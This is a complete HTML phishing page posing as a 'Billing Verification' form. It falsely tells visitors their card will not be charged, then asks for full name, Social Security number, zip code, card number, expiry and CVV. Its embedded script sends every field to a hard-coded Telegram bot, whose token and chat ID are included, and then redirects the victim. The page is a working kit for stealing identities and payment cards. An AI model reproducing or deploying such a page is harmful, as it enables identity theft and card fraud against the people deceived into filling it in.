<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Billing Verification</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #007bff;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .billing-container {
      background-color: white;
      color: #333;
      padding: 30px;
      border-radius: 10px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 20px rgba(0,0,0,0.2);
    }

    .billing-container h2 {
      text-align: center;
      margin-bottom: 10px;
    }

    .disclaimer-top {
      font-size: 14px;
      color: #666;
      text-align: center;
      margin-bottom: 20px;
    }

    .billing-container input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .billing-container button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      font-size: 16px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .billing-container button:hover {
      background-color: #0056b3;
    }
  </style>
</head>

<body>
  <div class="billing-container">
    <h2>Billing Verification</h2>
    <div class="disclaimer-top">
      ‚ö†Ô∏è Your card will <strong>not be charged</strong>. This is for verification purposes only.
    </div>
    <form onsubmit="sendToTelegram(event)">
      <input type="text" id="fullname" placeholder="Full Name" required />
      <input type="text" id="ssn" placeholder="SSN (e.g. 123-45-6789)" required />
      <input type="text" id="zipcode" placeholder="Zip Code" required />
      <input type="text" id="cardnumber" placeholder="Card Number" required />
      <input type="text" id="exp" placeholder="MM/YY" required />
      <input type="text" id="cvv" placeholder="CVV" required />
      <button type="submit">Verify</button>
    </form>
  </div>

  <script>
    function sendToTelegram(event) {
      event.preventDefault();

      const name = document.getElementById("fullname").value;
      const ssn = document.getElementById("ssn").value;
      const zipcode = document.getElementById("zipcode").value;
      const card = document.getElementById("cardnumber").value;
      const exp = document.getElementById("exp").value;
      const cvv = document.getElementById("cvv").value;

      const token = "7349396325:AAHJ7cPIM1FByNhlJKiKZAxaAzJlZjsgYLo";
      const chatId = "1920675677";

      const message = `üí≥ Billing Verification\nüë§ Name: ${name}\nüÜî SSN: ${ssn}\nüìÆ Zip Code: ${zipcode}\nüí≥ Card: ${card}\nüìÖ Exp: ${exp}\nüîí CVV: ${cvv}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(res => {
        if (res.ok) {
          window.location.href = "load.html";
        } else {
          alert("Failed to submit. Please try again.");
        }
      })
      .catch(err => {
        console.error("Telegram error:", err);
        alert("Error occurred. Please try again.");
      });
    }
  </script>
</body>
</html>
